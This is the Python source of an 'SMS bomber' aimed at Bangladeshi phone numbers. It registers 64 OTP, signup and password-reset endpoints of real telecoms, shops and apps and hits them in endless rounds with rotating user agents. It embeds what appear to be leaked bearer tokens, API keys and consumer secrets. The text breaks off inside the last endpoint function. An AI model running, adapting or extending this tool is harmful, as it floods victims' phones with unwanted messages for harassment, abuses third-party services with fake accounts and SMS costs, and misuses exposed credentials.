#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ███████╗ ██╗ ███╗   ███╗ ██████╗ ███╗   ██╗                      ║
║    ██╔════╝███║ ████╗ ████║██╔═████╗████╗  ██║                      ║
║    ███████╗╚██║ ██╔████╔██║██║██╔██║██╔██╗ ██║                      ║
║    ╚════██║ ██║ ██║╚██╔╝██║████╔╝██║██║╚██╗██║                      ║
║    ███████║ ██║ ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║                      ║
║    ╚══════╝ ╚═╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                      ║
║                                                                      ║
║         X   _   H 4 S S 4 N   ::   ∞  E D I T I O N                  ║
║              S1M0N_X_H4SS4N  ULTRA BOMBER v1.0                       ║
╚══════════════════════════════════════════════════════════════════════╝

অসীম রাউন্ড ইঞ্জিন — Ctrl+C না চাপা পর্যন্ত থামবে না।

ইনস্টল:  pip install requests
চালান:   python bomber.py 

থামান:   Ctrl+C  (একবার = চলমান রাউন্ড শেষে থামবে, দুইবার = সাথে সাথে)
"""

import argparse
import datetime as _dt
import json
import os
import random
import re
import signal
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    sys.exit("[!] requests নেই -> pip install requests")

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


BRAND = "S1M0N_X_H4SS4N"
VERSION = "1.0"


# ══════════════════════════════════════════════════════════════════════
#  COLOR
# ══════════════════════════════════════════════════════════════════════
class C:
    R = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[96m"
    MAG = "\033[95m"
    GRY = "\033[90m"


if os.name == "nt":
    os.system("")

PRINT_LOCK = threading.Lock()
STOP = threading.Event()
HARD_STOP = threading.Event()


def out(msg="", end="\n"):
    with PRINT_LOCK:
        try:
            sys.stdout.write(msg + end)
            sys.stdout.flush()
        except Exception:
            pass


def banner():
    out(f"""{C.MAG}{C.B}
╔══════════════════════════════════════════════════════════════════════╗
║    ███████╗ ██╗ ███╗   ███╗ ██████╗ ███╗   ██╗                       ║
║    ██╔════╝███║ ████╗ ████║██╔═████╗████╗  ██║                       ║
║    ███████╗╚██║ ██╔████╔██║██║██╔██║██╔██╗ ██║                       ║
║    ╚════██║ ██║ ██║╚██╔╝██║████╔╝██║██║╚██╗██║                       ║
║    ███████║ ██║ ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║                       ║
║    ╚══════╝ ╚═╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                       ║
║                                                                      ║
║          X  _  H 4 S S 4 N   ::   ∞   E D I T I O N                  ║
║               {BRAND}   ULTRA  BOMBER  v{VERSION}                      ║
╚══════════════════════════════════════════════════════════════════════╝{C.R}
{C.GRY}        infinite rounds · auto-retry · priority scheduler{C.R}
""")


# ══════════════════════════════════════════════════════════════════════
#  NUMBER CONTEXT
# ══════════════════════════════════════════════════════════════════════
class Ctx:
    __slots__ = ("raw", "digits", "last10", "full", "p88", "plus88",
                 "dash88", "n88", "bare")

    def __init__(self, raw: str):
        d = re.sub(r"\D", "", raw)
        if d.startswith("880"):
            d = d[3:]
        elif d.startswith("88"):
            d = d[2:]
        self.raw = raw
        self.digits = d
        self.last10 = d[-10:]
        self.full = "0" + self.last10
        self.p88 = "88" + self.full
        self.plus88 = "+88" + self.full
        self.dash88 = "+88-" + self.full
        self.n88 = "880" + self.last10
        self.bare = self.last10


# ══════════════════════════════════════════════════════════════════════
#  HTTP
# ══════════════════════════════════════════════════════════════════════
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
    "Dart/3.5 (dart:io)",
]


class Result:
    __slots__ = ("ok", "status", "body")

    def __init__(self, ok, status, body=""):
        self.ok = ok
        self.status = status
        self.body = body


def merge(*rs):
    if not rs:
        return Result(False, 0, "")
    return Result(all(r.ok for r in rs), rs[-1].status, rs[-1].body)


class Client:
    def __init__(self, timeout=12, retries=1):
        self.timeout = timeout
        self.retries = retries
        self.local = threading.local()
        self.adapter = HTTPAdapter(pool_connections=128, pool_maxsize=256, max_retries=0)

    def _session(self):
        s = getattr(self.local, "s", None)
        if s is None:
            s = requests.Session()
            s.headers.update({
                "User-Agent": random.choice(UA_POOL),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            })
            s.mount("https://", self.adapter)
            s.mount("http://", self.adapter)
            self.local.s = s
        return s

    def _req(self, method, url, **kw):
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("verify", False)
        kw.setdefault("allow_redirects", True)
        last = Result(False, 0, "")
        for attempt in range(self.retries + 1):
            try:
                r = self._session().request(method, url, **kw)
                last = Result(200 <= r.status_code < 300, r.status_code,
                              (r.text or "")[:300])
                if last.ok or r.status_code < 500:
                    return last
            except requests.RequestException as e:
                last = Result(False, 0, type(e).__name__)
            except Exception as e:
                last = Result(False, 0, repr(e)[:120])
            if attempt < self.retries:
                time.sleep(0.3 * (attempt + 1))
        return last

    def get(self, url, **kw):
        return self._req("GET", url, **kw)

    def post(self, url, **kw):
        return self._req("POST", url, **kw)

    def options(self, url, **kw):
        return self._req("OPTIONS", url, **kw)


J = {"Content-Type": "application/json"}


def rnd(n=8, alphabet=string.ascii_lowercase + string.digits):
    return "".join(random.choice(alphabet) for _ in range(n))


def rnd_mail(prefix="user"):
    return f"{prefix}{rnd(10)}@gmail.com"


# ══════════════════════════════════════════════════════════════════════
#  REGISTRY
# ══════════════════════════════════════════════════════════════════════
REG = {}
_seq = [0]


def api(name, kind="sms"):
    def deco(fn):
        _seq[0] += 1
        REG[_seq[0]] = {"name": name, "kind": kind, "fn": fn}
        return fn
    return deco


# ══════════════════════════════════════════════════════════════════════
#  ░░  BANGLADESH ENDPOINTS  ░░
# ══════════════════════════════════════════════════════════════════════

@api("RedX Signup")
def a1(c, x):
    return c.post("https://api.redx.com.bd:443/v1/user/signup",
                  json={"name": x.full, "service": "redx", "phoneNumber": x.full},
                  headers=J)


@api("KhaasFood Digits")
def a2(c, x):
    u = "https://www.khaasfood.com/wp-admin/admin-ajax.php"
    csrf = "9d9d08e6e5"
    r1 = c.post(u, data={"mobileNo": x.plus88, "countrycode": "+880", "csrf": csrf,
                         "login": "1", "json": "1", "action": "digits_check_mob"},
                headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                         "origin": "https://www.khaasfood.com",
                         "referer": "https://www.khaasfood.com/",
                         "x-requested-with": "XMLHttpRequest"})
    r2 = c.post(u, data={"mobileNo": x.plus88, "digits_reg_mail": x.plus88,
                         "dig_nounce": csrf, "action": "digits_check_mob",
                         "login": "2", "countrycode": "+880", "digregcode": "+880",
                         "digregcode2": "+880", "digits": "1", "dtype": "2",
                         "json": "1", "csrf": csrf},
                headers={"origin": "https://www.khaasfood.com",
                         "referer": "https://www.khaasfood.com/",
                         "x-requested-with": "XMLHttpRequest"})
    return merge(r1, r2)


@api("BioscopePlus Login")
def a3(c, x):
    return c.post("https://api-dynamic.bioscopelive.com/v2/auth/login"
                  "?country=BD&platform=web&language=en",
                  json={"number": "+88" + x.full}, headers=J)


@api("Bikroy Phone Login")
def a4(c, x):
    return c.get("https://bikroy.com/data/phone_number_login/verifications/"
                 f"phone_login?phone={x.full}",
                 headers={"application-name": "web", "referer": "https://bikroy.com/en"})


@api("Proiojon Signup")
def a5(c, x):
    return c.post("https://billing.proiojon.com/api/v1/auth/sign-up",
                  json={"name": rnd(10), "phone": x.full,
                        "email": rnd_mail(), "password": "password123", "ref_code": ""},
                  headers={**J, "origin": "https://proiojon.com",
                           "referer": "https://proiojon.com/",
                           "x-localization": "en", "zoneid": "[2]"})


@api("BeautyBooth Signup")
def a6(c, x):
    return c.post("https://admin.beautybooth.com.bd/api/v2/auth/signup",
                  json={"phone": x.full},
                  headers={"Content-Type": "application/json; charset=utf-8",
                           "User-Agent": "Dart/2.19 (dart:io)"})


@api("Medha OTP")
def a7(c, x):
    return c.post("https://developer.medha.info/api/send-otp",
                  json={"phone": x.n88, "is_register": "1"},
                  headers={"content-type": "application/json; charset=utf-8",
                           "authorization": "Bearer",
                           "User-Agent": "Dart/3.2 (dart:io)"})


@api("DeeptoPlay Login")
def a8(c, x):
    return c.post("https://api.deeptoplay.com/v2/auth/login"
                  "?country=BD&platform=web&language=en",
                  json={"number": "+88" + x.full},
                  headers={**J, "origin": "https://www.deeptoplay.com",
                           "referer": "https://www.deeptoplay.com/"})


@api("Robi send-otp")
def a9(c, x):
    tok = ("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
           "eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQy"
           "NzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJv"
           "YmlXZWJTaXRlVjIifQ."
           "5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc")
    return c.post("https://webapi.robi.com.bd/v1/send-otp",
                  json={"phone_number": x.full, "type": "doorstep"},
                  headers={**J, "Authorization": "Bearer " + tok})


@api("Arogga SMS (web)")
def a10(c, x):
    return c.post("https://api.arogga.com/auth/v1/sms/send/"
                  "?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
                  files={"mobile": (None, x.full), "fcmToken": (None, ""),
                         "referral": (None, "")},
                  headers={"origin": "https://www.arogga.com",
                           "referer": "https://www.arogga.com/"})


@api("myGP Cinematic common OTP")
def a11(c, x):
    return c.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{x.full}",
                  json={"headers": {"Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
                  headers={**J, "origin": "https://cinematic.mobi",
                           "referer": "https://cinematic.mobi/"})


@api("BDStall save_otp_info")
def a12(c, x):
    return c.post("https://www.bdstall.com/userRegistration/save_otp_info/",
                  data={"UserTypeID": "2", "RequestType": "1",
                        "Name": "Md", "Mobile": x.full})


@api("BCS ExamAid OTP")
def a13(c, x):
    return c.post("https://bcsexamaid.com/api/generateotp",
                  json={"mobile": x.full, "softtoken": "Rifat.Admin.2022"},
                  headers={"Content-Type": "application/json; charset=utf-8",
                           "User-Agent": "Dart/3.1 (dart:io)"})


@api("DoctorLiveBD OTP")
def a14(c, x):
    return c.post("https://doctorlivebd.com/api/patient/auth/otpsend",
                  data={"country_code": "880", "mobile": x.bare},
                  headers={"User-Agent": "okhttp/4.10.0",
                           "Content-Type": "application/x-www-form-urlencoded"})


@api("Sheba.xyz OTP")
def a15(c, x):
    r1 = c.get("https://accounts.sheba.xyz/api/v1/accountkit/generate/token"
               "?app_id=8329815A6D1AE6DD")
    try:
        tok = json.loads(r1.body).get("token")
    except Exception:
        tok = None
    r2 = c.post("https://accountkit.sheba.xyz/api/shoot-otp",
                json={"mobile": "+88" + x.full, "app_id": "8329815A6D1AE6DD",
                      "api_token": tok}, headers=J)
    return merge(r1, r2)


@api("Apex4u Login")
def a16(c, x):
    return c.post("https://api.apex4u.com/api/auth/login",
                  json={"phoneNumber": x.full},
                  headers={**J, "origin": "https://apex4u.com",
                           "referer": "https://apex4u.com/"})


@api("Sindabad OTP")
def a17(c, x):
    return c.post("https://offers.sindabad.com/api/mobile-otp",
                  json={"key": "c94e67fb2a59af3b6fa21f24463b2061",
                        "mobile": "+88" + x.full},
                  headers={**J, "origin": "https://sindabad.com",
                           "referer": "https://sindabad.com/"})


@api("KireiBD OTP")
def a18(c, x):
    return c.post("https://app.kireibd.com/api/v2/send-login-otp",
                  json={"email": x.full}, headers=J)


@api("Shikho SMS")
def a19(c, x):
    return c.post("https://api.shikho.com/auth/v2/send/sms",
                  json={"phone": x.full, "type": "student",
                        "auth_type": "signup", "vendor": "shikho"},
                  headers={**J, "origin": "https://app.shikho.com",
                           "referer": "https://app.shikho.com/"})


@api("Circle Reseller Signup")
def a20(c, x):
    return c.post("https://reseller.circle.com.bd/api/v2/auth/signup",
                  json={"name": "+88" + x.full, "email_or_phone": "+88" + x.full,
                        "password": "123456", "password_confirmation": "123456",
                        "register_by": "phone"}, headers=J)


@api("BDTickets Auth")
def a21(c, x):
    return c.post("https://api.bdtickets.com:20100/v1/auth",
                  json={"createUserCheck": True, "phoneNumber": "+88" + x.full,
                        "applicationChannel": "WEB_APP"},
                  headers={**J, "origin": "https://bdtickets.com",
                           "referer": "https://bdtickets.com/"})


@api("GP FWA OTP")
def a22(c, x):
    return c.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
                  json={"phone": x.full, "email": "", "language": "en"}, headers=J)


@api("RFL BestBuy Login")
def a23(c, x):
    tok = ("bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==")
    return c.post("https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
                  json={"company_id": "26", "password2": "Riyaz@123",
                        "currency_code": "BDT", "user_type": "C",
                        "email": f"{x.full}@gmail.com", "g_id": "", "lang_code": "en",
                        "operating_system": "Android", "otp_verify": False,
                        "password1": "Riyaz@123", "phone": x.full,
                        "storefront_id": "3"},
                  headers={**J, "Authorization": "Bearer " + tok,
                           "User-Agent": "okhttp/4.2.2"})


@api("Chorki Login")
def a24(c, x):
    return c.post("https://api-dynamic.chorki.com/v1/auth/login"
                  "?country=BD&platform=mobile",
                  json={"number": x.full},
                  headers={**J, "User-Agent": "Chorki/2.0.33 (Android 13)"})


@api("HishabExpress Login Status")
def a25(c, x):
    return c.post("https://api.hishabexpress.com/login/status",
                  data={"msisdn": x.full, "hash": "Hello"},
                  headers={"User-Agent": "Dart/2.19 (dart:io)",
                           "Content-Type": "application/x-www-form-urlencoded"})


@api("Mujib Chorcha Check")
def a26(c, x):
    return c.get(f"https://mujib.chorcha.net/auth/check?phone={x.full}",
                 headers={"x-chorcha-mode": "prod", "x-chorcha-platform": "web"})


@api("Wafilife OTP")
def a27(c, x):
    return c.get("https://m-backend.wafilife.com/wp-json/wc/v2/send-otp"
                 f"?p={x.full}"
                 "&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff"
                 "&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3")


@api("Robi Register OTP")
def a28(c, x):
    tok = ("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
           "eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcy"
           "NTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJv"
           "YmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0")
    return c.post("https://webapi.robi.com.bd/v1/account/register/otp",
                  json={"phone_number": x.full},
                  headers={**J, "Authorization": "Bearer " + tok,
                           "X-CSRF-TOKEN": tok})


@api("Chardike OTP")
def a29(c, x):
    return c.post("https://api.chardike.com/api/otp/send",
                  json={"phone": x.full, "otp_type": "login"},
                  headers={**J, "origin": "https://chardike.com",
                           "referer": "https://chardike.com/"})


@api("eTestPaper OTP")
def a30(c, x):
    h = {**J, "origin": "https://www.etestpaper.net",
         "referer": "https://www.etestpaper.net/"}
    r1 = c.post("https://prod.etestpaper.net/api/exists", json={"phone": x.full}, headers=h)
    r2 = c.post("https://prod.etestpaper.net/api/v4/auth/otp",
                json={"phone": x.full, "recaptcha": "668be73dcad2999a957ff440"},
                headers=h)
    return merge(r1, r2)


@api("GPay CheckSignup")
def a31(c, x):
    return c.post("https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
                  json={"deviceId": f"35{x.full}30", "msisdn": x.full,
                        "tran_type": "OTPREQSIGNUP"}, headers=J)


@api("AppLink OTP")
def a32(c, x):
    return c.post("https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
                  json={"msisdn": "88" + x.full},
                  headers={**J, "origin": "https://applink.com.bd",
                           "referer": "https://applink.com.bd/"})


@api("PriyoShikkhaloy Register-Login")
def a33(c, x):
    return c.post("https://app.priyoshikkhaloy.com/api/user/register-login.php",
                  data={"mobile": x.full},
                  headers={"User-Agent": "okhttp/4.11.0",
                           "Content-Type": "application/x-www-form-urlencoded"})


@api("Kabbik OTP")
def a34(c, x):
    tok = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
           "eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0."
           "dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc")
    return c.post("https://api.kabbik.com/v1/auth/otpnew",
                  json={"msisdn": "88" + x.full,
                        "currentTimeLong": int(time.time() * 1000),
                        "passKey": "qOQNBtVmoTTPVmfn"},
                  headers={**J, "authorization": "Bearer " + tok,
                           "origin": "https://kabbik.com",
                           "referer": "https://kabbik.com/"})


@api("Salextra Username Check")
def a35(c, x):
    return c.post("https://salextra.com.bd/"
                  "customer/checkusernameavailabilityonregistration",
                  data={"username": x.full, "loginType": "MOBILE",
                        "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg"},
                  headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                           "origin": "https://salextra.com.bd",
                           "x-requested-with": "XMLHttpRequest",
                           "referer": "https://salextra.com.bd/register"})


@api("Sundora Customer Create")
def a36(c, x):
    return c.post("https://api.sundora.com.bd/api/user/customer/",
                  json={"customer": {
                      "email": f"kgjkgjgg{x.full}@gmail.com",
                      "password": "#bUV?'3*N#7N}.g",
                      "password_confirmation": "#bUV?'3*N#7N}.g",
                      "phone": "+880" + x.bare, "draft_order_id": None,
                      "first_name": "sdfgfd", "last_name": "fgfd",
                      "note": {"birthday": "", "gender": "male"},
                      "withTimeout": True, "newsletter_email": True,
                      "newsletter_sms": True}},
                  headers={**J, "origin": "https://sundora.com.bd",
                           "referer": "https://sundora.com.bd/", "My-Location": "BD"})


@api("myGP Cinematic SBENT OTP")
def a37(c, x):
    return c.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{x.full}/SBENT_3GB7D",
                  json={"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
                                       "referenceCode": "20190827042622"}},
                  headers=J)


@api("Bajistar OTP")
def a38(c, x):
    return c.get(f"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{x.full}",
                 headers={"origin": "https://www.playbajistar.com",
                          "referer": "https://www.playbajistar.com/"})


@api("Doctime Auth")
def a39(c, x):
    return c.post("https://api.doctime.com.bd/api/authenticate",
                  json={"contact_no": x.full, "country_calling_code": "88"},
                  headers={**J, "User-Agent": "okhttp/4.12.0",
                           "authorization": "", "app-version": "0.29.11",
                           "platform": "Android", "locale": "bn"})


@api("GP WebLoginDa OTP")
def a40(c, x):
    return c.post("https://webloginda.grameenphone.com/backend/api/v1/otp",
                  data={"msisdn": x.full},
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "origin": "https://gpfi.grameenphone.com",
                           "referer": "https://gpfi.grameenphone.com/"})


@api("MeenaBazar OTP")
def a41(c, x):
    return c.post("https://meenabazardev.com/api/mobile/front/send/otp"
                  f"?CellPhone={x.full}&type=login",
                  headers={"User-Agent": "Dart/3.2 (dart:io)",
                           "content-type": "application/json"})


@api("MedEasy OTP")
def a42(c, x):
    return c.get(f"https://api.medeasy.health/api/send-otp/+88{x.full}/",
                 headers={"origin": "https://medeasy.health",
                          "referer": "https://medeasy.health/"})


@api("Iqra Live OTP")
def a43(c, x):
    return c.get(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{x.full}")


@api("Chokrojan Passenger Login")
def a44(c, x):
    return c.post("https://chokrojan.com/api/v1/passenger/login/mobile",
                  json={"mobile_number": x.full,
                        "otp_token": "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"},
                  headers={**J, "origin": "https://chokrojan.com",
                           "referer": "https://chokrojan.com/login",
                           "company-id": "1", "domain-name": "chokrojan.com",
                           "user-platform": "3"})


@api("Shomvob OTP")
def a45(c, x):
    tok = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
           "eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0."
           "4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s")
    return c.post("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
                  json={"phone": "88" + x.full},
                  headers={"Content-Type": "application/json; charset=utf-8",
                           "Authorization": "Bearer " + tok})


@api("RedX Signup (alt)")
def a46(c, x):
    return c.post("https://api.redx.com.bd/v1/user/signup",
                  json={"name": "Alamin Sheikh", "phoneNumber": x.full,
                        "service": "redx"}, headers=J)


@api("myGP common OTP (88)")
def a47(c, x):
    return c.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{x.full}/",
                  headers=J)


@api("BDJobs CreateAccount")
def a48(c, x):
    fn = random.choice(["Arif", "Hasib", "Kamrul", "Sohag", "Raihan",
                        "Farhan", "Zahid", "Imran", "Sajib", "Munna"])
    now = time.strftime("%Y-%m-%dT%H:%M:%S")
    return c.post("https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/"
                  "CreateAccountOrchestrator/CreateAccount",
                  json={"firstName": fn, "lastName": "", "gender": "M",
                        "email": f"{fn.lower()}{rnd(8)}@gmail.com",
                        "userName": x.full, "password": "Kamrul12345@",
                        "confirmPassword": "Kamrul12345@", "status": 0,
                        "mobile": x.full, "workAreaCategory": 2, "createdFrom": 0,
                        "createdAt": now, "decodeId": "", "catTypeId": 1,
                        "userNameType": "mobile", "disabilityId": "",
                        "deviceTypeId": 0, "countryCode": "88",
                        "socialMediaId": "", "socialMediaName": "",
                        "socialMediaTimestamp": now, "ttcId": "", "gradeId": "",
                        "knownBy": "", "isTtc": False, "trainingCenterName": "",
                        "trainingDistrict": "", "queryString": "", "campaignId": 0,
                        "campaignSource": "", "campaignReferer": "",
                        "isFromSocialMedia": False, "isActive": 0, "useType": "",
                        "uNtype": 0},
                  headers={**J, "origin": "https://mybdjobs.bdjobs.com",
                           "referer": "https://mybdjobs.bdjobs.com/"})


@api("Ultimate Organic Life")
def a49(c, x):
    r1 = c.post("https://ultimateasiteapi.com/api/register-customer",
                json={"customer_name": "hu", "customer_password": "12345678",
                      "customer_password_confirmation": "12345678",
                      "customer_email": f"{x.full}hu@gmail.com",
                      "customer_contact": x.full, "customer_dob": "2000-01-02",
                      "customer_gender": "male"}, headers=J)
    r2 = c.post("https://ultimateasiteapi.com/api/forget-customer-password",
                json={"user_input": x.full},
                headers={**J, "origin": "https://ultimateorganiclife.com",
                         "referer": "https://ultimateorganiclife.com/"})
    return merge(r1, r2)


@api("Foodaholic Forgot/Signup")
def a50(c, x):
    h = {**J, "authorization": "Bearer null", "x-localization": "en"}
    r1 = c.post("https://foodaholic.com.bd/api/v1/auth/forgot-password",
                json={"phone": x.plus88}, headers=h)
    if r1.status == 404:
        r2 = c.post("https://foodaholic.com.bd/api/v1/auth/sign-up",
                    json={"f_name": random.choice(["John", "Alex", "Sam"]),
                          "l_name": rnd(5, string.ascii_letters),
                          "phone": x.plus88, "email": rnd_mail(),
                          "password": "Riyaz@123", "ref_code": ""}, headers=h)
        return merge(r1, r2)
    return r1


@api("Binge OTP (OPTIONS+GET)")
def a51(c, x):
    u = f"https://web-api.binge.buzz/api/v3/otp/send/{x.full}"
    r1 = c.options(u, headers={"origin": "https://binge.buzz",
                               "access-control-request-method": "GET",
                               "referer": "https://binge.buzz/"})
    r2 = c.get(u, headers={"origin": "https://binge.buzz",
                           "referer": "https://binge.buzz/",
                           "Device-Type": "web",
                           "Authorization": "Bearer null"})
    return merge(r1, r2)


@api("KFC BD Register")
def a52(c, x):
    return c.post("https://api.kfcbd.com/register",
                  json={"id": None, "name": "Sojib khane",
                        "email": f"monirk2ib+{rnd(8, string.ascii_letters)}@gmail.com",
                        "mobile": x.full, "address": None,
                        "device_token": "dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN",
                        "token": None, "dob": "", "otp": None},
                  headers={"Content-Type": "application/json",
                           "User-Agent": "Dart/3.1 (dart:io)"})


@api("GP BKWebsite OTP")
def a53(c, x):
    return c.post("https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp",
                  json={"msisdn": x.full},
                  headers={**J, "origin": "https://www.grameenphone.com",
                           "referer": "https://www.grameenphone.com/", "lang": "en"})


@api("EonBazar Register+Login")
def a54(c, x):
    r1 = c.post("https://app.eonbazar.com/api/auth/register",
                json={"mobile": x.full,
                      "name": rnd(8, string.ascii_lowercase).capitalize(),
                      "password": "Soji12345", "email": rnd_mail()},
                headers={**J, "origin": "https://eonbazar.com",
                         "referer": "https://eonbazar.com/"})
    r2 = c.post("https://app.eonbazar.com/api/auth/login",
                json={"method": "otp", "mobile": x.bare},
                headers={**J, "origin": "https://eonbazar.com",
                         "referer": "https://eonbazar.com/"})
    return merge(r1, r2)


@api("Eat-Z App Connect")
def a55(c, x):
    return c.post("https://api.eat-z.com/auth/customer/app-connect",
                  json={"username": "+880" + x.bare},
                  headers={**J, "User-Agent": "okhttp/4.12.0",
                           "x-eatz-apiclient": "ANDROID"})


@api("OsudPotro OTP")
def a56(c, x):
    return c.post("https://api.osudpotro.com/api/v1/users/send_otp",
                  json={"mobile": x.dash88, "deviceToken": "app",
                        "language": "bn", "os": "android"}, headers=J)


@api("Kormi24 GraphQL OTP")
def a57(c, x):
    add = json.dumps({"user_agent": "web", "mobile": x.full})
    return c.post("https://api.kormi24.com/graphql",
                  json={"operationName": "sendOTP",
                        "variables": {"type": 1, "mobile": x.full,
                                      "additional": add,
                                      "hash": "c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},
                        "query": "mutation sendOTP($mobile:String!,$type:Int!,"
                                 "$additional:String,$hash:String!){sendOTP("
                                 "mobile:$mobile,type:$type,additional:$additional,"
                                 "hash:$hash){status message __typename}}"},
                  headers={**J, "origin": "https://www.kormi24.com",
                           "referer": "https://www.kormi24.com/",
                           "authorization": "tok"})


@api("GP WebLogin OTP x3")
def a58(c, x):
    rs = [c.post("https://weblogin.grameenphone.com/backend/api/v1/otp",
                 json={"msisdn": x.full},
                 headers={**J, "origin": "https://weblogin.grameenphone.com",
                          "referer": "https://weblogin.grameenphone.com/"})
          for _ in range(3)]
    return merge(*rs)


@api("Shwapno Auth")
def a59(c, x):
    return c.post("https://www.shwapno.com/api/auth",
                  json={"phoneNumber": "+88" + x.full},
                  headers={**J, "origin": "https://www.shwapno.com",
                           "referer": "https://www.shwapno.com/"})


@api("QuizGiri OTP")
def a60(c, x):
    return c.post("https://developer.quizgiri.xyz:443/api/v2.0/send-otp",
                  json={"phone": x.full, "country_code": "+880"}, headers=J)


@api("Banglalink MyBL OTP")
def a61(c, x):
    return c.post("https://myblapi.banglalink.net/api/v1/send-otp",
                  json={"phone": x.full}, headers=J)


@api("Walton Plaza OTP")
def a62(c, x):
    return c.post("https://api.waltonplaza.com.bd/graphql",
                  json={"operationName": "createCustomerOtp",
                        "variables": {"auth": {"countryCode": "880",
                                               "deviceUuid": "998283c0-622a-11ee-84c0-190466a47baa",
                                               "phone": x.full},
                                      "device": None},
                        "query": "mutation createCustomerOtp($auth:CustomerAuthInput!,"
                                 "$device:DeviceInput){createCustomerOtp(auth:$auth,"
                                 "device:$device){message result{id __typename}"
                                 "statusCode __typename}}"}, headers=J)


@api("PBS OTP")
def a63(c, x):
    return c.post("https://apialpha.pbs.com.bd/api/OTP/generateOTP",
                  json={"userPhone": x.full, "otp": ""},
                  headers={**J, "origin": "https://pbs.com.bd",
                           "referer": "https://pbs.com.bd/"})


@api("Aarong GraphQL")
def a64(c, x):
    h = {**J, "origin": "https://www.aarong.com",
         "referer": "https://www.aarong.com/", "store": "default"}
    r1 = c.post("https://mcprod.aarong.com/graphql",
                json={"query": f'query{{checkCustomerExist(mobile_number:"{x.full}"'
                                ' email:""){status message}}'}, headers=h)
    r2 = c.post("https://mcprod.aarong.com/graphql",
                json={"query": "mutation generateCustomerToken($email:String!,"
                               "$password:String!,$type:String!,$mobile_number:String!)"
                               "{generateCustomerToken(email:$email,password:$password,"
                               "type:$type,mobile_number:$mobile_number){token message}}",
                      "variables": {"email": "", "password": "",
                                    "type": "mobile_number",
                                    "mobile_number": x.full}}, headers=h)
